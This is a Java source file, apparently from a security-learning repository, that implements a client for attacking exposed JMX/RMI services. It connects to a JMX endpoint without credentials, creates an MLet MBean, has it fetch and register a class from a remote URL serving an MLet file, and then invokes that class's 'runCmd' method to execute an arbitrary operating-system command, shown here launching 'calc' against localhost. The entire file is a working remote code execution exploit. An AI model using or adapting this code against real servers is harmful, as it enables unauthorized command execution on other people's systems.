package basics.jmx.attack;

import javax.management.InstanceAlreadyExistsException;
import javax.management.MBeanServerConnection;
import javax.management.ObjectInstance;
import javax.management.ObjectName;
import javax.management.remote.JMXConnector;
import javax.management.remote.JMXConnectorFactory;
import javax.management.remote.JMXServiceURL;
import java.util.HashSet;

/**
 * 客户端攻击服务器
 *
 * @author baB_hyf
 * @date 2021/04/01
 */
public class AttackClient {

    public static void main(String[] args) {
        connectAndCmd("localhost", "1099", "calc", "http://127.0.0.1:8701/mlet");
    }

    public static void connectAndCmd(String serverName, String port, String command, String registerUrl) {

        try {
            // 获取服务器连接
            JMXServiceURL jmxServiceURL = new JMXServiceURL("service:jmx:rmi:///jndi/rmi://" + serverName + ":" + port + "/jmxrmi");
            JMXConnector jmxConnector = JMXConnectorFactory.connect(jmxServiceURL, null);
            MBeanServerConnection mBeanServerConnection = jmxConnector.getMBeanServerConnection();

            ObjectInstance evilObject = null;
            try {
                evilObject = mBeanServerConnection.createMBean("javax.management.loading.MLet", null);
            } catch (InstanceAlreadyExistsException e) {
                evilObject = mBeanServerConnection.getObjectInstance(new ObjectName("DefaultDomain:type=MLet"));
            }

            System.out.println("Load " + evilObject.getClassName());

            // 反射调用方法，注册MBean对象
            Object res = mBeanServerConnection.invoke(
                    evilObject.getObjectName(),
                    "getMBeansFromURL",
                    new Object[]{registerUrl},
                    new String[]{String.class.getName()}
            );

            @SuppressWarnings("unchecked")
            HashSet<Object> mBeanSet = (HashSet<Object>) res;

            for (Object mBean : mBeanSet) {
                if (mBean instanceof Exception) {
                    ((Exception) mBean).printStackTrace();
                    continue;
                }

                ObjectInstance registerBean = ((ObjectInstance) mBean);

                System.out.println("Loaded class: " + registerBean.getClassName() + "--- object: " + registerBean.getObjectName());
                System.out.println("Calling runCommand with: " + command);

                Object result = mBeanServerConnection.invoke(registerBean.getObjectName(), "runCmd", new Object[]{command}, new String[]{String.class.getName()});

                System.out.println("Result: " + result);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}
